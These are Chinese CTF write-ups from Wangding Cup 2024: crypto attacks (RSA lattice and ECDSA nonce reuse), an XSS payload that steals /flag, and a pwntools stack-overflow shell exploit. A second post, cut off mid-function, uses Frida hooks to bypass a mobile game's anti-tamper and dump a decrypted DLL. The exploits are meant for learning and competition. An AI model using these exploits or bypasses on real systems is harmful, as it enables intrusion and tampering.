60930873636939710528141652371287627298970658591028170597199994159301433213017349592910581153194811053524011559886529831760967700162629319952838130973563991607758850226327915934518549584588693854388996425152821459866209334446088324204759334980239670811977086959854952233887459542997456604453766160444477603017 c = 11058775585296329544235824126670578486484201903851563493984057289075513008773878014007377223222464555346135675900619903617528838701118612201290486747980233570288315027654510774940371032813981282018787668864123759554297515664915358447425647424759926416629451915378248520432568536260902676664298855076689608823 hint1 = 884675140903190287932 hint2 = 1000130673738973880482 根据检索，发现是RSA高位爆破题目，并且在2023江苏省领航杯有对应的题目，而且非常凑巧的是师傅写了个傻瓜脚本\nhttps://www.cnblogs.com/mumuhhh/p/17789591.html#bd\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 import time time.clock = time.time debug = True strict = False helpful_only = True dimension_min = 7 # 如果晶格达到该尺寸，则停止移除 # 显示有用矢量的统计数据 def helpful_vectors(BB, modulus): nothelpful = 0 for ii in range(BB.dimensions()[0]): if BB[ii,ii] \u0026gt;= modulus: nothelpful += 1 print (nothelpful, \u0026#34;/\u0026#34;, BB.dimensions()[0], \u0026#34; vectors are not helpful\u0026#34;) # 显示带有 0 和 X 的矩阵 def matrix_overview(BB, bound): for ii in range(BB.dimensions()[0]): a = (\u0026#39;%02d \u0026#39; % ii) for jj in range(BB.dimensions()[1]): a += \u0026#39;0\u0026#39; if BB[ii,jj] == 0 else \u0026#39;X\u0026#39; if BB.dimensions()[0] \u0026lt; 60: a += \u0026#39; \u0026#39; if BB[ii, ii] \u0026gt;= bound: a += \u0026#39;~\u0026#39; #print (a) # 尝试删除无用的向量 # 从当前 = n-1（最后一个向量）开始 def remove_unhelpful(BB, monomials, bound, current): # 我们从当前 = n-1（最后一个向量）开始 if current == -1 or BB.dimensions()[0] \u0026lt;= dimension_min: return BB # 开始从后面检查 for ii in range(current, -1, -1): # 如果它没有用 if BB[ii, ii] \u0026gt;= bound: affected_vectors = 0 affected_vector_index = 0 # 让我们检查它是否影响其他向量 for jj in range(ii + 1, BB.dimensions()[0]): # 如果另一个向量受到影响： # 我们增加计数 if BB[jj, ii] != 0: affected_vectors += 1 affected_vector_index = jj # 等级：0 # 如果没有其他载体最终受到影响 # 我们删除它 if affected_vectors == 0: #print (\u0026#34;* removing unhelpful vector\u0026#34;, ii) BB = BB.delete_columns([ii]) BB = BB.delete_rows([ii]) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # 等级：1 #如果只有一个受到影响，我们会检查 # 如果它正在影响别的向量 elif affected_vectors == 1: affected_deeper = True for kk in range(affected_vector_index + 1, BB.dimensions()[0]): # 如果它影响哪怕一个向量 # 我们放弃这个 if BB[kk, affected_vector_index] != 0: affected_deeper = False # 如果没有其他向量受到影响，则将其删除，并且 # 这个有用的向量不够有用 #与我们无用的相比 if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) \u0026lt; abs(bound - BB[ii, ii]): #print (\u0026#34;* removing unhelpful vectors\u0026#34;, ii, \u0026#34;and\u0026#34;, affected_vector_index) BB = BB.delete_columns([affected_vector_index, ii]) BB = BB.delete_rows([affected_vector_index, ii]) monomials.pop(affected_vector_index) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # nothing happened return BB \u0026#34;\u0026#34;\u0026#34; Returns: * 0,0 if it fails * -1，-1 如果 \u0026#34;strict=true\u0026#34;，并且行列式不受约束 * x0,y0 the solutions of `pol` \u0026#34;\u0026#34;\u0026#34; def boneh_durfee(pol, modulus, mm, tt, XX, YY): \u0026#34;\u0026#34;\u0026#34; Boneh and Durfee revisited by Herrmann and May 在以下情况下找到解决方案： * d \u0026lt; N^delta * |x|\u0026lt; e^delta * |y|\u0026lt; e^0.5 每当 delta \u0026lt; 1 - sqrt（2）/2 ~ 0.292 \u0026#34;\u0026#34;\u0026#34; # substitution (Herrman and May) PR.\u0026lt;u, x, y\u0026gt; = PolynomialRing(ZZ) #多项式环 Q = PR.quotient(x*y + 1 - u) # u = xy + 1 polZ = Q(pol).lift() UU = XX*YY + 1 # x-移位 gg = [] for kk in range(mm + 1): for ii in range(mm - kk + 1): xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk gg.append(xshift) gg.sort() # 单项式 x 移位列表 monomials = [] for polynomial in gg: for monomial in polynomial.monomials(): #对于多项式中的单项式。单项式（）： if monomial not in monomials: # 如果单项不在单项中 monomials.append(monomial) monomials.sort() # y-移位 for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk) yshift = Q(yshift).lift() gg.append(yshift) # substitution # 单项式 y 移位列表 for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): monomials.append(u^kk * y^jj) # 构造格 B nn = len(monomials) BB = Matrix(ZZ, nn) for ii in range(nn): BB[ii, 0] = gg[ii](0, 0, 0) for jj in range(1, ii + 1): if monomials[jj] in gg[ii].monomials(): BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY) #约化格的原型 if helpful_only: # #自动删除 BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1) # 重置维度 nn = BB.dimensions()[0] if nn == 0: print (\u0026#34;failure\u0026#34;) return 0,0 # 检查向量是否有帮助 if debug: helpful_vectors(BB, modulus^mm) # 检查行列式是否正确界定 det = BB.det() bound = modulus^(mm*nn) if det \u0026gt;= bound: print (\u0026#34;We do not have det \u0026lt; bound. Solutions might not be found.\u0026#34;) print (\u0026#34;Try with highers m and t.\u0026#34;) if debug: diff = (log(det) - log(bound)) / log(2) print (\u0026#34;size det(L) - size e^(m*n) = \u0026#34;, floor(diff)) if strict: return -1, -1 else: print (\u0026#34;det(L) \u0026lt; e^(m*n) (good! If a solution exists \u0026lt; N^delta, it will be found)\u0026#34;) # display the lattice basis if debug: matrix_overview(BB, modulus^mm) # LLL if debug: print (\u0026#34;optimizing basis of the lattice via LLL, this can take a long time\u0026#34;) #BB = BB.BKZ(block_size=25) BB = BB.LLL() if debug: print (\u0026#34;LLL is done!\u0026#34;) # 替换向量 i 和 j -\u0026gt;多项式 1 和 2 if debug: print (\u0026#34;在格中寻找线性无关向量\u0026#34;) found_polynomials = False for pol1_idx in range(nn - 1): for pol2_idx in range(pol1_idx + 1, nn): # 对于i and j, 构造两个多项式 PR.\u0026lt;w,z\u0026gt; = PolynomialRing(ZZ) pol1 = pol2 = 0 for jj in range(nn): pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY) pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY) # 结果 PR.\u0026lt;q\u0026gt; = PolynomialRing(ZZ) rr = pol1.resultant(pol2) if rr.is_zero() or rr.monomials() == [1]: continue else: print (\u0026#34;found them, using vectors\u0026#34;, pol1_idx, \u0026#34;and\u0026#34;, pol2_idx) found_polynomials = True break if found_polynomials: break if not found_polynomials: print (\u0026#34;no independant vectors could be found. This should very rarely happen...\u0026#34;) return 0, 0 rr = rr(q, q) # solutions soly = rr.roots() if len(soly) == 0: print (\u0026#34;Your prediction (delta) is too small\u0026#34;) return 0, 0 soly = soly[0][0] ss = pol1(q, soly) solx = ss.roots()[0][0] return solx, soly def example(): ############################################ # 随机生成数据 ########################################## #start_time =time.perf_counter start =time.clock() size=512 length_N = 2*size; ss=0 s=70; M=1 # the number of experiments delta = 299/1024 # p = random_prime(2^512,2^511) for i in range(M): # p = random_prime(2^size,None,2^(size-1)) # q = random_prime(2^size,None,2^(size-1)) # if(p\u0026lt;q): # temp=p # p=q # q=temp N = e = c = hint1 = # p高位 hint2 = # q高位 # print (\u0026#34;p真实高\u0026#34;,s,\u0026#34;比特：\u0026#34;, int(p/2^(512-s))) # print (\u0026#34;q真实高\u0026#34;,s,\u0026#34;比特：\u0026#34;, int(q/2^(512-s))) # N = p*q; # 解密指数d的指数( 最大0.292) m = 7 # 格大小（越大越好/越慢） t = round(((1-2*delta) * m)) # 来自 Herrmann 和 May 的优化 X = floor(N^delta) # Y = floor(N^(1/2)/2^s) # 如果 p、 q 大小相同，则正确 for l in range(int(hint1),int(hint1)+1): print(\u0026#39;\\n\\n\\n l=\u0026#39;,l) pM=l; p0=pM*2^(size-s)+2^(size-s)-1; q0=N/p0; qM=int(q0/2^(size-s)) A = N + 1-pM*2^(size-s)-qM*2^(size-s); #A = N+1 P.\u0026lt;x,y\u0026gt; = PolynomialRing(ZZ) pol = 1 + x * (A + y) #构建的方程 # Checking bounds #if debug: #print (\u0026#34;=== 核对数据 ===\u0026#34;) #print (\u0026#34;* delta:\u0026#34;, delta) #print (\u0026#34;* delta \u0026lt; 0.292\u0026#34;, delta \u0026lt; 0.292) #print (\u0026#34;* size of e:\u0026#34;, ceil(log(e)/log(2))) # e的bit数 # print (\u0026#34;* size of N:\u0026#34;, len(bin(N))) # N的bit数 #print (\u0026#34;* size of N:\u0026#34;, ceil(log(N)/log(2))) # N的bit数 #print (\u0026#34;* m:\u0026#34;, m, \u0026#34;, t:\u0026#34;, t) # boneh_durfee if debug: ##print (\u0026#34;=== running algorithm ===\u0026#34;) start_time = time.time() solx, soly = boneh_durfee(pol, e, m, t, X, Y) if solx \u0026gt; 0: #print (\u0026#34;=== solution found ===\u0026#34;) if False: print (\u0026#34;x:\u0026#34;, solx) print (\u0026#34;y:\u0026#34;, soly) d_sol = int(pol(solx, soly) / e) ss=ss+1 print (\u0026#34;=== solution found ===\u0026#34;) print (\u0026#34;p的高比特为：\u0026#34;,l) print (\u0026#34;q的高比特为：\u0026#34;,qM) print (\u0026#34;d=\u0026#34;,d_sol) if debug: print(\u0026#34;=== %s seconds ===\u0026#34; % (time.time() - start_time)) #break print(\u0026#34;ss=\u0026#34;,ss) #end=time.process_time end=time.clock() print(\u0026#39;Running time: %s Seconds\u0026#39;%(end-start)) if __name__ == \u0026#34;__main__\u0026#34;: example() 所以把数据填进去，经过四十秒的紧张计算就得到了d\nd=697791299328204454525050115930116025227680411125210507143694169686384063060766101784129969\n然后来个经典的RSA解密脚本\n1 2 3 4 5 6 7 8 from Crypto.Util.number import * n = 114118679597315994458138232536029700477506764789782067073905766324635160145597602207164997807103187990046901850125798774503781767630201814025142189432534890147340404293319424524872695905368897290630698362559606549134377263394129199145835483978820237203114250882524438599220793209608842281879976692805855046971 d = 697791299328204454525050115930116025227680411125210507143694169686384063060766101784129969 c = 11058775585296329544235824126670578486484201903851563493984057289075513008773878014007377223222464555346135675900619903617528838701118612201290486747980233570288315027654510774940371032813981282018787668864123759554297515664915358447425647424759926416629451915378248520432568536260902676664298855076689608823 m = pow(c,d,n) print(long_to_bytes(m)) 解出flag为wdflag{c5b3e498-0f4c-4f40-937f-e690d8062b89}\nCrypto02（By Luminoria） 运维人员在网络监控中发现了一段可疑的字符串，经过初步分析，他们怀疑这段数据可能是使用AES加密的。为了确定这段数据的内容，他们需要找到正确的密钥。\n题目源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 # coding: utf-8 #!/usr/bin/env python2 import gmpy2 import random import binascii from hashlib import sha256 from sympy import nextprime from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import long_to_bytes from FLAG import flag #flag = \u0026#39;wdflag{123}\u0026#39; def victory_encrypt(plaintext, key): key = key.upper() key_length = len(key) plaintext = plaintext.upper() ciphertext = \u0026#39;\u0026#39; for i, char in enumerate(plaintext): if char.isalpha(): shift = ord(key[i % key_length]) - ord(\u0026#39;A\u0026#39;) encrypted_char = chr((ord(char) - ord(\u0026#39;A\u0026#39;) + shift) % 26 + ord(\u0026#39;A\u0026#39;)) ciphertext += encrypted_char else: ciphertext += char return ciphertext victory_key = \u0026#34;WANGDINGCUP\u0026#34; victory_encrypted_flag = victory_encrypt(flag, victory_key) p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f a = 0 b = 7 xG = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798 yG = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8 G = (xG, yG) n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 h = 1 zero = (0,0) dA = nextprime(random.randint(0, n)) if dA \u0026gt; n: print(\u0026#34;warning!!\u0026#34;) def addition(t1, t2): if t1 == zero: return t2 if t2 == zero: return t2 (m1, n1) = t1 (m2, n2) = t2 if m1 == m2: if n1 == 0 or n1 != n2: return zero else: k = (3 * m1 * m1 + a) % p * gmpy2.invert(2 * n1 , p) % p else: k = (n2 - n1 + p) % p * gmpy2.invert((m2 - m1 + p) % p, p) % p m3 = (k * k % p - m1 - m2 + p * 2) % p n3 = (k * (m1 - m3) % p - n1 + p) % p return (int(m3),int(n3)) def multiplication(x, k): ans = zero t = 1 while(t \u0026lt;= k): if (k \u0026amp;t )\u0026gt;0: ans = addition(ans, x) x = addition(x, x) t \u0026lt;\u0026lt;= 1 return ans def getrs(z, k): (xp, yp) = P r = xp s = (z + r * dA % n) % n * gmpy2.invert(k, n) % n return r,s z1 = random.randint(0, p) z2 = random.randint(0, p) k = random.randint(0, n) P = multiplication(G, k) hA = multiplication(G, dA) r1, s1 = getrs(z1, k) r2, s2 = getrs(z2, k) print(\u0026#34;r1 = {}\u0026#34;.format(r1)) print(\u0026#34;r2 = {}\u0026#34;.format(r2)) print(\u0026#34;s1 = {}\u0026#34;.format(s1)) print(\u0026#34;s2 = {}\u0026#34;.format(s2)) print(\u0026#34;z1 = {}\u0026#34;.format(z1)) print(\u0026#34;z2 = {}\u0026#34;.format(z2)) key = sha256(long_to_bytes(dA)).digest() cipher = AES.new(key, AES.MODE_CBC) iv = cipher.iv encrypted_flag = cipher.encrypt(pad(victory_encrypted_flag.encode(), AES.block_size)) encrypted_flag_hex = binascii.hexlify(iv + encrypted_flag).decode(\u0026#39;utf-8\u0026#39;) print(\u0026#34;Encrypted flag (AES in CBC mode, hex):\u0026#34;, encrypted_flag_hex) # output # r1 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 # r2 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 # s1 = 86614391420642776223990568523561232627667766343605236785504627521619587526774 # s2 = 99777373725561160499828739472284705447694429465579067222876023876942075279416 # z1 = 96525870193778873849147733081234547336150390817999790407096946391065286856874 # z2 = 80138688082399628724400273131729065525373481983222188646486307533062536927379 # (\u0026#39;Encrypted flag (AES in CBC mode, hex):\u0026#39;, u\u0026#39;6c201c3c4e8b0a2cdd0eca11e7101d45d7b33147d27ad1b9d57e3d1e20c7b3c2e36b8da3142dfd5abe335a604ce7018878b9f157099211a7bbda56ef5285ec0b\u0026#39;) 题目说的是AES加密，而且可以看到这里面还融合了其他的加密，然后我们写出解密脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 import gmpy2 import binascii from hashlib import sha256 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad from Crypto.Util.number import long_to_bytes # Parameters from the original code p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F a = 0 b = 7 xG = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798 yG = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8 G = (xG, yG) n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 h = 1 zero = (0, 0) # From the provided values r1 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 r2 = 111817653331957669294460466848850458804857945556928458406600106150268654577388 s1 = 86614391420642776223990568523561232627667766343605236785504627521619587526774 s2 = 99777373725561160499828739472284705447694429465579067222876023876942075279416 z1 = 96525870193778873849147733081234547336150390817999790407096946391065286856874 z2 = 80138688082399628724400273131729065525373481983222188646486307533062536927379 # Calculate k k = (z1 - z2) * gmpy2.invert(s1 - s2, n) % n # Calculate dA dA = (s1 * k - z1) * gmpy2.invert(r1, n) % n # Generate AES key key = sha256(long_to_bytes(dA)).digest() # Decrypt the AES-CBC ciphertext encrypted_flag_hex = \u0026#34;6c201c3c4e8b0a2cdd0eca11e7101d45d7b33147d27ad1b9d57e3d1e20c7b3c2e36b8da3142dfd5abe335a604ce7018878b9f157099211a7bbda56ef5285ec0b\u0026#34; encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex) iv = encrypted_flag_bytes[:16] ciphertext = encrypted_flag_bytes[16:] cipher = AES.new(key, AES.MODE_CBC, iv) decrypted_flag = unpad(cipher.decrypt(ciphertext), AES.block_size) # Decrypt the Caesar cipher victory_key = \u0026#34;WANGDINGCUP\u0026#34; decrypted_flag_text = \u0026#34;\u0026#34; for char in decrypted_flag.decode(): if char.isalpha(): shift = ord(victory_key[len(decrypted_flag_text) % len(victory_key)]) - ord(\u0026#34;A\u0026#34;) decrypted_char = chr((ord(char) - ord(\u0026#34;A\u0026#34;) - shift) % 26 + ord(\u0026#34;A\u0026#34;)) decrypted_flag_text += decrypted_char else: decrypted_flag_text += char lower_flag = decrypted_flag_text.lower() print(\u0026#34;Decrypted flag:\u0026#34;, lower_flag) 运行后得到flag：wdflag{58ae00432d8228c9e3a927bbcd8d67d2}\nWeb Web02（By KeqingMoe） 某安全测试人员接到了一项重要任务：对一套无人机系统的后台进行安全测试。这套系统负责管理无人机的飞行、数据传输和任务调度，请您测试该后台是否安全。\n先试着随便输一个账号密码，发现直接登进去了\n在输入框输入一些东西，点更新，更新成功，然后返回，发现下面就多了一行字。\n写一点 html 交上去，发现可以。联系它说的点提交会审核清单，从而想到 XSS 攻击。\n经过简单地猜测，检查到 /flag 下有东西，访问，但得到“你是 boss 嘛？就想看其他无人机拟定执行任务？”从而想到用 xss 把 flag 拿到传回来\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; fetch(\u0026#39;/flag\u0026#39;) .then(data =\u0026gt; data.text()).then(data =\u0026gt; fetch(\u0026#39;/content/b279d32c6978a402f855956b080bb8a3\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; }, body: `content=${encodeURIComponent(data)}` } ) ).catch(error =\u0026gt; console.error(\u0026#39;Error: \u0026#39;, error) ) \u0026lt;/script\u0026gt; 从而拿到 flag 是 wdflag{z0b2pvf3fk1d77rks6a4y6fs5chn6sqh}\nMISC MISC03（By ZZPeng） 近日某公司服务器遭到恶意攻击，随后公司立即对流量监测系统中遭受攻击时段的流量进行了取证，但是公司某一网络安全实习生进行分析溯源后并未找到攻击者的攻击IP，于是公司决定将这个任务重新交给更具经验的你来进行，接手工作后，你立即对其进行了深入调查！\n先过滤http请求（http \u0026amp;\u0026amp; http.response.code != 404），然后发现有三个请求里面传了hacker.php，可以得到IP为39.168.5.60\nMISC04（By KeqingMoe） 某测试人员刚刚完成了一款图像加密算法的开发，想要邀请你进行深入的分析测试。\n图形很扭曲，并且似乎有规律可循。根据它的形状，想到 Peano 分形曲线\n搜索到一篇 IrisCTF2024 上的题目，也是 Peano 分形曲线处理过的图片的题，参考后得到如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from PIL import Image from tqdm import tqdm def peano(n): if n == 0: return [[0, 0]] else: in_lst = peano(n - 1) lst = in_lst.copy() px, py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + 1 + i[0], py + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px - i[0], py - 1 - i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + i[0], py - 1 - i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + 1 + i[0], py + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px - i[0], py + 1 + i[1]] for i in in_lst) px, py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) return lst order = peano(6) img = Image.open(\u0026#34;r.png\u0026#34;) width, height = img.size block_width = width block_height = height new_image = Image.new(\u0026#34;RGB\u0026#34;, (width, height)) for i, (x, y) in tqdm(enumerate(order)): new_x, new_y = i % width, i // width pixel = img.getpixel((x, height - 1 - y)) new_image.putpixel((new_x, new_y), pixel) new_image.save(\u0026#34;rr.jpg\u0026#34;) 处理后，得到一张图片，是一个二维码\n扫了得到 wdflag{dde235fa-114d-404c-8add-6007e6efabfd}\nPWN PWN02（By ZZPeng） IDA 静态分析得到用户名密码 admin, admin123\nvuln函数存在栈溢出漏洞\n发现后门函数gift, 字符串/bin/sh\n编写利用脚本 getshell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * def exp(): context.log_level=\u0026#39;debug\u0026#39; context(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;) ELFpath = \u0026#39;./short\u0026#39; e = ELF(ELFpath) # p = process(ELFpath) p = remote(\u0026#39;0192d781680b7e11bd1fe073f5e5923d.el7z.dg10.ciihw.cn\u0026#39;, 46319) p.sendlineafter(\u0026#39;username: \u0026#39;, \u0026#39;admin\u0026#39;) p.sendlineafter(\u0026#39;password: \u0026#39;, \u0026#39;admin123\u0026#39;) buf = int(p.recvline_startswith(\u0026#39;You will input this: \u0026#39;).decode()[21:], 16) print (f\u0026#39;buf:{hex(buf)}\\n\u0026#39;) vuln = e.symbols[\u0026#39;vuln\u0026#39;] gift = e.symbols[\u0026#39;gift\u0026#39;] bin_sh = 0x0804A038 leave = 0x08048555 offset = 0x50 - 0x4*4 # gdb.attach(p) print (f\u0026#39;vuln:{hex(vuln)} gift:{hex(gift)}\u0026#39;) payload = b\u0026#39;aaaa\u0026#39;+p32(gift)+p32(0)+p32(bin_sh) p.sendafter(\u0026#39;plz input your msg:\u0026#39;, payload + cyclic(offset) +p32(buf) + p32(leave)) # p.sendafter(\u0026#39;plz input your msg:\u0026#39;, b\u0026#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae\u0026#39;) p.interactive() if __name__ == \u0026#39;__main__\u0026#39;: exp() wdflag{r6kghxuwgu60zb4q1rvp5943zak91ygf}\nReverse REVERSE01（By Jeremiah） IDA 打开可以看到 flag 被分成了 4 部分加密\n第一部分把用户输入的前 8 字节的两倍赋值给 s1\n第二部分把 input 的 8-16 字节和字符串 XorrLord 异或第三部分进行 base64 编码\n第四部分进行 AES 加密\n解密过程很简单，前两部分手逆即可\n这里注意一下有个换表操作\nAES 写个脚本即可\n最后把四个部分拼起来得到 flag: wdflag{9e855bae8f9aaafe9a2eb2cbd8823519}\n本篇文章由队长Luminoria编写\n","date":"2024-12-30T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501011926019.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bwriteup%E6%9C%80%E5%A5%BD%E3%81%AE%E4%B8%80%E5%8F%89%E6%A0%91%E4%BD%BF%E7%94%A8%E8%80%85/","title":"第四届网鼎杯网络安全大赛青龙组初赛writeup(最好の一叉树使用者)"},{"content":"gslab2021 初赛 - 安卓客户端安全 | Xhy\u0026rsquo;s Blogwp参考\nAssembly CSharp.dll文件已加密，路径为X:\\GameSafety\\Game2021\\安卓客户端题目\\初赛题目\\RocketMouse\\assets\\bin\\Data\\Managed\nmono引擎的unity游戏，包名com.personal.rocketmouse\n启动游戏会弹窗hacker detect并退出，在com.tencent.games.sec2021.Sec2021MsgBox下找到onDismiss方法调用系统函数exit\n查找show的交叉引用找到com.tencent.games.sec2021.Sec2021IPC的onNativeEngineResponse方法，猜测调用了native层的函数使进程退出，在ida中找kill函数的交叉引用找到函数sub_1F788，继续查找函数调用链找到1FAA8，该函数被调用了5次\n用florida过掉了检测\n查看libmono.so发现libmono.so经过了加密，用elf-dump-fix在libmono.so加载之后从内存中dump并修复得到解密后的monodump.so\n找到libmono.so的mono_image_open_from_data_with_name方法，此处用于加载Assembly-CSharp.dll文件，发现第一条指令用于跳转到libsec2021.so的sub_1CEDC函数，此函数用于对Assembly-CSharp.dll文件解密\n会先判断如果是MZ开头并且路径中没有Assembly-CSsharp.dll文件，就跳转到0x1CF88执行，否则就调用0x1CF4C解密函数，如图，此处会将sec2021.png的0x410B至末尾的数据解密，解密结果为真正加载的Assembly-CSharp.dll,查看函数调用可以看到解密函数为0x1D2A0\n其中sub_18CEC为获取dll索引，crc32校验函数为subF3B4正常会返回0，直接把返回值patch成0即可过检测\n过完检测之后因为mono_image_open_from_data_with_name函数的第一条指令会完成解密操作，所以可以hook下一条指令，当读取到真正的Assembly-CSharp.dll时在内存中dump出来\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 function hook_mono() { var libbase = Module.findBaseAddress(\u0026#34;libmono.so\u0026#34;); console.log(\u0026#34;libbase\u0026#34;, libbase); var addr = Module.findExportByName(\u0026#34;libmono.so\u0026#34;, \u0026#34;mono_image_open_from_data_with_name\u0026#34;); console.log(\u0026#34;mono_image_open_from_data_with_name\u0026#34;, addr); Interceptor.attach(addr.add(4), { onEnter: function (args) { var data = args[0]; var data_len = args[1]; console.log(\u0026#34;data_length = \u0026#34;,data_len); console.log(\u0026#39;data = \u0026#39;,data); if (data_len == 0x2800) { WriteMemToFile(data,data_len.toInt32(),\u0026#39;dump.bin\u0026#39;); } console.log(\u0026#34;mono_image_open_from_data_with_name_ori() called!\u0026#34;, data, data_len); }, onLeave: function (retval) { } }); } function hook_dlopen(){ var dlopen = Module.findExportByName(null, \u0026#34;dlopen\u0026#34;); console.log(dlopen); if(dlopen != null){ Interceptor.attach(dlopen,{ onEnter: function(args){ var soName = args[0].readCString(); console.log(soName); this.is_mono_loaded = false; this.is_sec2021_loaded = false; if(soName.indexOf(\u0026#34;libsec2021.so\u0026#34;) !== -1){ //hook_initarray(); this.is_sec2021_loaded = true; } if(soName.indexOf(\u0026#34;libmono.so\u0026#34;) !== -1){ this.is_mono_loaded = true; } }, onLeave: function(retval){ if(this.is_mono_loaded){ //hook_getString(); hook_mono(); } } }); } var android_dlopen_ext = Module.findExportByName(null, \u0026#34;android_dlopen_ext\u0026#34;); console.log(android_dlopen_ext); if(android_dlopen_ext != null){ Interceptor.attach(android_dlopen_ext,{ onEnter: function(args){ var soName = args[0].readCString(); console.log(soName); this.is_mono_loaded = false; if(soName.indexOf(\u0026#34;libmono.so\u0026#34;) !== -1){ this.is_mono_loaded = true; } this.is_sec2021_loaded = soName.indexOf(\u0026#34;libsec2021.so\u0026#34;) !== -1; }, onLeave: function(retval){ if(this.is_mono_loaded){ //hook_getString(); hook_mono(); } } }); } } hook_dlopen(); function WriteMemToFile(addr, size, file_path) { Java.perform(function() { // let prefix: string = 